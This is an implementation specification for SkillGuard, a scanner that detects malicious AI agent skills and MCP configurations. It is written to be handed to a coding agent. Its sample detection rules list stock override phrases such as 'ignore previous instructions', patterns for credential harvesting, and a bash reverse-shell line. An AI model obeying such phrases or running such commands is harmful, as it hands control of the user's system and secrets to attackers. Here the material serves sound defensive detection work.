# SkillGuard - Implementation Specification for AI Coding Agents

> **Purpose**: This document is designed to feed directly into Claude Code or Cursor to build SkillGuard, a production-grade AI Agent Skills security scanner. It provides the complete technical specification derived from the full PRD (see SkillGuard_PRD_v1.0.docx).

---

## Project Overview

**SkillGuard** is a "VirusTotal for AI Agent Skills" — a multi-engine security scanner that detects malicious, vulnerable, and policy-violating content in Claude Code Skills, Cursor Skills, MCP Server configurations, and agentic tool definitions.

### Why This Exists

- Snyk's ToxicSkills research found 76 confirmed malicious skills out of 3,984 scanned from ClawHub
- 36% of skills exhibited prompt injection patterns
- OWASP ranks Prompt Injection as #1 LLM vulnerability (73% of production deployments affected)
- Skills embed attacks in **natural language** (SKILL.md) not just code — current tools miss this attack surface

---

## Repository Structure

```
skillguard/
├── pyproject.toml                  # Project config (use hatch or poetry)
├── README.md
├── LICENSE
├── Dockerfile
├── docker-compose.yml
├── .github/
│   └── workflows/
│       └── ci.yml
├── src/
│   └── skillguard/
│       ├── __init__.py
│       ├── __main__.py             # CLI entry point
│       ├── cli/
│       │   ├── __init__.py
│       │   ├── main.py             # Click CLI app
│       │   └── formatters.py       # Rich terminal output
│       ├── api/
│       │   ├── __init__.py
│       │   ├── app.py              # FastAPI application
│       │   ├── routes/
│       │   │   ├── scan.py         # POST /scan, GET /scan/{id}
│       │   │   ├── skill.py        # GET /skill/{sha256}
│       │   │   ├── monitor.py      # Continuous monitoring endpoints
│       │   │   ├── rules.py        # Rule management endpoints
│       │   │   ├── policy.py       # Policy engine endpoints
│       │   │   └── inventory.py    # Asset inventory endpoints
│       │   ├── models.py           # Pydantic request/response models
│       │   └── auth.py             # API key + OAuth2 authentication
│       ├── core/
│       │   ├── __init__.py
│       │   ├── scanner.py          # Main scan orchestrator
│       │   ├── skill_parser.py     # SKILL.md + YAML frontmatter parser
│       │   ├── hasher.py           # SHA256 hashing for all components
│       │   ├── verdict.py          # Verdict aggregation + risk scoring
│       │   └── ai_bom.py           # CycloneDX AI-BOM generator
│       ├── engines/
│       │   ├── __init__.py
│       │   ├── base.py             # Abstract engine interface
│       │   ├── prompt_injection/
│       │   │   ├── __init__.py
│       │   │   ├── ml_classifier.py    # DeBERTa v3 inference
│       │   │   ├── yara_scanner.py     # YARA prompt rules
│       │   │   ├── regex_scanner.py    # Pattern matching
│       │   │   └── vector_search.py    # Embedding similarity
│       │   ├── sast/
│       │   │   ├── __init__.py
│       │   │   ├── semgrep_engine.py   # Semgrep integration
│       │   │   ├── secret_detector.py  # API keys, tokens, creds
│       │   │   └── dependency_check.py # pip/npm vuln scanning
│       │   ├── structural/
│       │   │   ├── __init__.py
│       │   │   ├── schema_validator.py # Skill structure validation
│       │   │   ├── permission_analyzer.py # Tool access analysis
│       │   │   └── obfuscation_detector.py # Encoded payload detection
│       │   ├── mcp/
│       │   │   ├── __init__.py
│       │   │   ├── tool_poisoning.py   # Tool description analysis
│       │   │   ├── tool_shadowing.py   # Duplicate tool name detection
│       │   │   ├── hash_pinner.py      # Schema hash tracking
│       │   │   └── config_scanner.py   # MCP config file parsing
│       │   └── sandbox/
│       │       ├── __init__.py
│       │       ├── executor.py         # Bubblewrap/gVisor sandbox
│       │       └── behavior_analyzer.py # Syscall/network monitoring
│       ├── intelligence/
│       │   ├── __init__.py
│       │   ├── threat_db.py        # Known malicious hashes/IOCs
│       │   ├── vector_store.py     # ChromaDB attack embeddings
│       │   ├── community.py        # Verdicts + comments
│       │   └── mitre_mapper.py     # ATT&CK technique mapping
│       ├── monitoring/
│       │   ├── __init__.py
│       │   ├── file_watcher.py     # inotify skill directory watcher
│       │   ├── drift_detector.py   # Hash comparison for rug pulls
│       │   └── scheduler.py        # Periodic re-scan jobs
│       ├── reporting/
│       │   ├── __init__.py
│       │   ├── json_report.py
│       │   ├── sarif_report.py
│       │   ├── html_report.py
│       │   └── pdf_report.py
│       ├── governance/
│       │   ├── __init__.py
│       │   ├── policy_engine.py    # OPA integration
│       │   ├── rbac.py             # Role-based access control
│       │   └── audit_log.py        # Immutable audit trail
│       └── db/
│           ├── __init__.py
│           ├── models.py           # SQLAlchemy ORM models
│           ├── migrations/         # Alembic migrations
│           └── session.py          # Database session management
├── rules/
│   ├── prompt_injection/
│   │   ├── SG-PI-001-instruction-override.yml
│   │   ├── SG-PI-002-role-hijacking.yml
│   │   ├── SG-PI-003-system-prompt-extraction.yml
│   │   ├── SG-PI-004-ignore-previous.yml
│   │   └── ...                     # 25+ rules
│   ├── credential_theft/
│   │   ├── SG-CT-001-api-key-harvest.yml
│   │   ├── SG-CT-002-env-file-access.yml
│   │   └── ...                     # 15+ rules
│   ├── code_execution/
│   │   ├── SG-CE-001-reverse-shell.yml
│   │   ├── SG-CE-002-eval-injection.yml
│   │   └── ...                     # 15+ rules
│   ├── data_exfiltration/
│   │   └── ...                     # 10+ rules
│   ├── obfuscation/
│   │   └── ...                     # 10+ rules
│   ├── mcp_specific/
│   │   └── ...                     # 10+ rules
│   └── semgrep/
│       ├── python-dangerous-exec.yml
│       ├── python-subprocess-shell.yml
│       ├── bash-curl-exfil.yml
│       └── ...
├── models/
│   └── prompt_injection/           # DeBERTa ONNX model files
├── yara_rules/
│   ├── prompt_injection.yar
│   ├── credential_patterns.yar
│   ├── obfuscation.yar
│   └── exfiltration.yar
├── web/                            # React frontend
│   ├── package.json
│   ├── src/
│   │   ├── App.tsx
│   │   ├── pages/
│   │   │   ├── ScanPage.tsx        # Upload + scan
│   │   │   ├── ResultsPage.tsx     # Scan results viewer
│   │   │   ├── InventoryPage.tsx   # Asset inventory
│   │   │   ├── RulesPage.tsx       # Rule management
│   │   │   └── DashboardPage.tsx   # Analytics dashboard
│   │   └── components/
│   │       ├── RiskGauge.tsx
│   │       ├── FindingsTable.tsx
│   │       ├── EngineVerdicts.tsx
│   │       └── SkillStructureTree.tsx
│   └── ...
├── tests/
│   ├── conftest.py
│   ├── test_skill_parser.py
│   ├── test_prompt_injection.py
│   ├── test_sast_engine.py
│   ├── test_mcp_scanner.py
│   ├── test_verdict_scoring.py
│   ├── test_api.py
│   ├── fixtures/
│   │   ├── clean_skill/            # Known safe skill for testing
│   │   ├── malicious_skill/        # Known malicious skill for testing
│   │   └── edge_cases/             # Edge case skills
│   └── ...
└── docs/
    ├── architecture.md
    ├── rule_authoring.md
    ├── api_reference.md
    └── deployment.md
```

---

## Core Data Models (Pydantic)

```python
from enum import Enum
from pydantic import BaseModel
from datetime import datetime

class Severity(str, Enum):
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"

class Verdict(str, Enum):
    CLEAN = "clean"
    LOW_RISK = "low_risk"
    SUSPICIOUS = "suspicious"
    HIGH_RISK = "high_risk"
    MALICIOUS = "malicious"

class EngineVerdict(str, Enum):
    CLEAN = "clean"
    SUSPICIOUS = "suspicious"
    MALICIOUS = "malicious"

class SkillPlatform(str, Enum):
    CLAUDE_CODE = "claude_code"
    CLAUDE_DESKTOP = "claude_desktop"
    CURSOR = "cursor"
    WINDSURF = "windsurf"
    OPENCLAW = "openclaw"
    GENERIC = "generic"

class FileType(str, Enum):
    SKILL_MD = "skill_md"
    FRONTMATTER = "frontmatter"
    SCRIPT_PYTHON = "script_python"
    SCRIPT_BASH = "script_bash"
    SCRIPT_JS = "script_javascript"
    TEMPLATE = "template"
    RESOURCE = "resource"
    CONFIG = "config"
    OTHER = "other"

class SkillFile(BaseModel):
    path: str
    file_type: FileType
    sha256: str
    size_bytes: int
    content: str | None = None

class Finding(BaseModel):
    rule_id: str
    rule_name: str
    severity: Severity
    category: str
    description: str
    file_path: str
    line_start: int | None = None
    line_end: int | None = None
    snippet: str | None = None
    cwe: str | None = None
    owasp_llm: list[str] = []
    mitre_attack: list[str] = []
    confidence: float  # 0.0 - 1.0
    remediation: str | None = None

class EngineResult(BaseModel):
    engine_name: str
    engine_version: str
    verdict: EngineVerdict
    confidence: float
    detection_name: str | None = None
    findings: list[Finding] = []
    duration_ms: int

class ScanResult(BaseModel):
    scan_id: str
    skill_name: str
    skill_sha256: str
    platform: SkillPlatform
    scan_started: datetime
    scan_completed: datetime
    composite_score: int  # 0-100
    verdict: Verdict
    engine_results: list[EngineResult] = []
    total_findings: int
    findings_by_severity: dict[str, int]
    files_scanned: int
    owasp_coverage: list[str] = []

class ScanRequest(BaseModel):
    skill_path: str | None = None  # Local path
    git_url: str | None = None     # Git repository URL
    zip_content: bytes | None = None  # Uploaded ZIP
    scan_type: str = "full"        # full, quick, scripts_only
    platform: SkillPlatform = SkillPlatform.GENERIC

class DetectionRule(BaseModel):
    id: str
    name: str
    description: str
    severity: Severity
    category: str
    owasp_llm: list[str] = []
    mitre_attack: list[str] = []
    target: str  # SKILL_MD, FRONTMATTER, SCRIPT, etc.
    engine: str  # REGEX, YARA, SEMGREP, ML_CLASSIFIER
    pattern: str | dict
    false_positive_notes: str | None = None
    remediation: str | None = None
    references: list[str] = []
    enabled: bool = True
```

---

## Engine Interface

All scanning engines implement this abstract interface:

```python
from abc import ABC, abstractmethod

class ScanEngine(ABC):
    """Base interface for all SkillGuard scanning engines."""
    
    @property
    @abstractmethod
    def name(self) -> str:
        """Unique engine name (e.g., 'prompt_injection_ml')."""
        
    @property
    @abstractmethod
    def version(self) -> str:
        """Engine version string."""
    
    @abstractmethod
    async def scan(self, skill_files: list[SkillFile], 
                   rules: list[DetectionRule] | None = None) -> EngineResult:
        """
        Scan skill files and return results.
        
        Args:
            skill_files: Parsed skill files to scan
            rules: Optional specific rules (uses defaults if None)
            
        Returns:
            EngineResult with verdict, confidence, and findings
        """
    
    @abstractmethod
    async def health_check(self) -> bool:
        """Check if engine is operational."""
```

---

## Scan Orchestrator

```python
class ScanOrchestrator:
    """Coordinates parallel execution of all scanning engines."""
    
    def __init__(self, engines: list[ScanEngine], rules_db: RulesDB,
                 threat_intel: ThreatIntelDB, policy_engine: PolicyEngine):
        self.engines = engines
        self.rules_db = rules_db
        self.threat_intel = threat_intel
        self.policy_engine = policy_engine
    
    async def scan(self, request: ScanRequest) -> ScanResult:
        """Full scan pipeline:
        1. Parse & normalize skill structure
        2. Hash all components (quick lookup)
        3. Check threat intelligence (known malicious?)
        4. Run all engines in parallel
        5. Aggregate verdicts into composite score
        6. Apply organizational policies
        7. Generate report
        """
```

---

## Risk Scoring Algorithm

```python
def calculate_risk_score(engine_results: list[EngineResult],
                         threat_intel_match: bool = False,
                         trusted_publisher: bool = False) -> tuple[int, Verdict]:
    """
    Calculate composite risk score (0-100) from engine results.
    
    Scoring:
    - CRITICAL finding: +40 points each (capped at 100)
    - HIGH finding: +20 points each
    - MEDIUM finding: +10 points each
    - LOW finding: +3 points each
    
    Modifiers:
    - Engine consensus: if 3+ engines say MALICIOUS, score = max(score, 90)
    - Threat intel match: instant 100
    - Trusted publisher: -10 points
    - Behavioral sandbox C2/exfil: instant 100
    
    Verdicts:
    - CLEAN: 0-20
    - LOW_RISK: 21-40
    - SUSPICIOUS: 41-60
    - HIGH_RISK: 61-80
    - MALICIOUS: 81-100
    """
```

---

## Detection Rule Format (YAML)

```yaml
# rules/prompt_injection/SG-PI-001-instruction-override.yml
id: SG-PI-001
name: Instruction Override Pattern
description: >
  Detects patterns that attempt to override agent system instructions,
  such as "ignore previous instructions", "disregard your guidelines",
  or "you are now a different agent". These patterns in SKILL.md or
  YAML descriptions indicate potential prompt injection attacks.
severity: critical
category: prompt_injection
owasp_llm: [LLM01]
mitre_attack: [T1059.006]
target: SKILL_MD  # Also applied to FRONTMATTER
engine: REGEX
pattern:
  any:
    - "(?i)ignore\\s+(all\\s+)?(previous|prior|above|earlier)\\s+(instructions|prompts|rules|guidelines|directives)"
    - "(?i)disregard\\s+(your|all|any)\\s+(rules|guidelines|instructions|safety|restrictions)"
    - "(?i)you\\s+are\\s+now\\s+(a|an)\\s+(?!skill|tool|helper)"
    - "(?i)forget\\s+(everything|all)\\s+(you|that)\\s+(know|were|have)"
    - "(?i)override\\s+(system|safety|security)\\s+(prompt|instructions|settings)"
    - "(?i)new\\s+instructions?:\\s"
    - "(?i)system\\s*:\\s*you\\s+are"
false_positive_notes: >
  Skills that teach about prompt injection (educational content) may trigger
  this rule. Check if the pattern appears in an educational/example context.
remediation: >
  Remove or rephrase instructions that could be interpreted as attempting to 
  override agent behavior. If this is educational content, clearly mark it 
  as an example within a code block or quoted section.
references:
  - https://genai.owasp.org/llmrisk/llm01-prompt-injection/
  - https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/
```

```yaml
# rules/credential_theft/SG-CT-001-api-key-harvest.yml
id: SG-CT-001
name: API Key Harvesting Pattern
description: >
  Detects skill instructions that direct the agent to read, collect,
  or transmit API keys, tokens, or credentials from environment 
  variables, config files, or keychains.
severity: critical
category: credential_theft
owasp_llm: [LLM06]
mitre_attack: [T1552.001, T1003]
target: ANY
engine: REGEX
pattern:
  any:
    - "(?i)(read|get|fetch|extract|collect|harvest|steal|grab|dump)\\s+.{0,30}(api.?key|token|credential|secret|password|auth)"
    - "(?i)(send|post|upload|transmit|exfil)\\s+.{0,30}(api.?key|token|credential|secret|password)"
    - "(?i)\\.(env|credentials|netrc|aws|gcloud|azure)\\b"
    - "(?i)(keychain|credential.?store|secret.?manager|vault)"
    - "(?i)curl\\s+.{0,50}(api.?key|token|bearer)"
remediation: >
  Skills should never instruct agents to access or transmit credentials.
  If credential access is required, use proper secret management APIs
  with explicit user consent.
```

```yaml
# rules/code_execution/SG-CE-001-reverse-shell.yml
id: SG-CE-001
name: Reverse Shell Detection
description: >
  Detects reverse shell patterns in bundled scripts that could 
  establish unauthorized remote access to the host system.
severity: critical
category: code_execution
owasp_llm: [LLM06]
mitre_attack: [T1059, T1071]
target: SCRIPT
engine: SEMGREP
pattern:
  rules:
    - id: reverse-shell-python
      patterns:
        - pattern: socket.socket(...)
        - pattern: subprocess.call(["/bin/sh", ...])
      message: "Potential reverse shell pattern detected"
    - id: reverse-shell-bash
      pattern: |
        bash -i >& /dev/tcp/$IP/$PORT 0>&1
      message: "Bash reverse shell pattern"
remediation: >
  Remove any code that establishes outbound shell connections.
  If remote access is needed, use authenticated, audited channels.
```

---

## CLI Interface

```bash
# Quick scan (hash lookup only)
skillguard scan /path/to/skill --quick

# Full scan with all engines
skillguard scan /path/to/skill

# Scan from Git URL
skillguard scan --git https://github.com/author/my-skill

# Scan with specific output format
skillguard scan /path/to/skill --format sarif --output results.sarif

# Scan all installed skills (auto-discover)
skillguard scan --discover

# Monitor skills directory for changes
skillguard monitor ~/.claude/skills/

# Check a skill hash against threat intelligence
skillguard lookup sha256:abc123...

# List and manage detection rules
skillguard rules list
skillguard rules enable SG-PI-001
skillguard rules add custom-rule.yml

# Generate AI-BOM
skillguard bom /path/to/skill --format cyclonedx --output skill-bom.json

# Start the API server
skillguard server --host 0.0.0.0 --port 8080

# Start MCP proxy mode
skillguard proxy --client claude-desktop
```

---

## API Endpoints (OpenAPI)

```yaml
openapi: "3.0.3"
info:
  title: SkillGuard API
  version: "1.0.0"
paths:
  /api/v1/scan:
    post:
      summary: Submit a skill for scanning
      requestBody:
        content:
          multipart/form-data:
            schema:
              type: object
              properties:
                skill_zip: { type: string, format: binary }
                platform: { type: string, enum: [claude_code, cursor, windsurf, generic] }
                scan_type: { type: string, enum: [full, quick, scripts_only] }
          application/json:
            schema:
              type: object
              properties:
                git_url: { type: string }
                platform: { type: string }
      responses:
        "202":
          description: Scan accepted
          content:
            application/json:
              schema:
                type: object
                properties:
                  scan_id: { type: string }
                  status: { type: string }
                  estimated_time_seconds: { type: integer }
  
  /api/v1/scan/{scan_id}:
    get:
      summary: Get scan results
      responses:
        "200":
          description: Scan results (ScanResult schema)
  
  /api/v1/skill/{sha256}:
    get:
      summary: Instant reputation lookup by hash
      responses:
        "200":
          description: Known reputation or "not seen"
  
  /api/v1/monitor:
    post:
      summary: Register skill path for continuous monitoring
  
  /api/v1/rules:
    get:
      summary: List all detection rules
    post:
      summary: Add custom detection rule
  
  /api/v1/ai-bom/{sha256}:
    get:
      summary: Generate CycloneDX AI-BOM for a skill
```

---

## Key Dependencies (pyproject.toml)

```toml
[project]
name = "skillguard"
version = "0.1.0"
requires-python = ">=3.12"
dependencies = [
    # API
    "fastapi>=0.115",
    "uvicorn[standard]>=0.34",
    "python-multipart>=0.0.18",
    
    # CLI
    "click>=8.1",
    "rich>=13.9",
    
    # Scanning engines
    "yara-python>=4.5",
    "onnxruntime>=1.20",          # DeBERTa prompt injection model
    "transformers>=4.47",          # Tokenizer for DeBERTa
    "detect-secrets>=1.5",         # Secret detection
    
    # Vector database
    "chromadb>=0.5",
    "sentence-transformers>=3.3",  # Embedding generation
    
    # Data & DB
    "sqlalchemy[asyncio]>=2.0",
    "alembic>=1.14",
    "asyncpg>=0.30",               # PostgreSQL async driver
    "pydantic>=2.10",
    
    # Task queue
    "celery[redis]>=5.4",
    
    # Reporting
    "jinja2>=3.1",                 # HTML report templates
    
    # Monitoring
    "watchdog>=6.0",               # File system watcher
    
    # AI-BOM
    "cyclonedx-python-lib>=8.0",
    
    # Utilities
    "pyyaml>=6.0",
    "httpx>=0.28",
    "python-jose>=3.3",            # JWT handling
]

[project.optional-dependencies]
semgrep = ["semgrep>=1.100"]       # Optional: SAST engine
sandbox = ["bubblewrap"]           # Optional: behavioral sandbox
```

---

## GitHub Action Integration

```yaml
# .github/workflows/skillguard-scan.yml
name: SkillGuard Skill Security Scan
on:
  push:
    paths: ['.claude/skills/**', '.cursor/skills/**']
  pull_request:
    paths: ['.claude/skills/**', '.cursor/skills/**']

jobs:
  skill-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Install SkillGuard
        run: pip install skillguard
      - name: Scan Skills
        run: |
          skillguard scan .claude/skills/ \
            --format sarif \
            --output skillguard-results.sarif \
            --fail-on high
      - name: Upload SARIF
        uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: skillguard-results.sarif
```

---

## Implementation Phases

### Phase 1 (MVP - Build First)
1. `skill_parser.py` - Parse SKILL.md structure, YAML frontmatter, enumerate files
2. `hasher.py` - SHA256 for all components
3. `regex_scanner.py` - 50+ regex rules for prompt injection + credential patterns
4. `yara_scanner.py` - YARA rules for obfuscation + malware patterns  
5. `semgrep_engine.py` - Custom Semgrep rules for script SAST
6. `secret_detector.py` - API key / token detection
7. `verdict.py` - Risk scoring algorithm
8. `cli/main.py` - Click CLI with Rich output
9. `api/app.py` - FastAPI with scan/results/lookup endpoints
10. `json_report.py` + `sarif_report.py` - Report generation

### Phase 2 (Intelligence - Build Second)
1. `ml_classifier.py` - DeBERTa ONNX prompt injection model
2. `vector_store.py` - ChromaDB attack embeddings
3. `threat_db.py` - Known malicious hash database
4. `mcp/` engines - Tool poisoning, shadowing, hash pinning
5. `file_watcher.py` + `drift_detector.py` - Continuous monitoring
6. `html_report.py` - Rich HTML reports
7. Web UI (React)

### Phase 3 (Enterprise - Build Third)
1. `sandbox/` - Behavioral analysis
2. `policy_engine.py` - OPA integration
3. `rbac.py` - Role-based access
4. `ai_bom.py` - CycloneDX generation
5. `community.py` - Verdicts + reputation
6. Dashboard (Grafana)
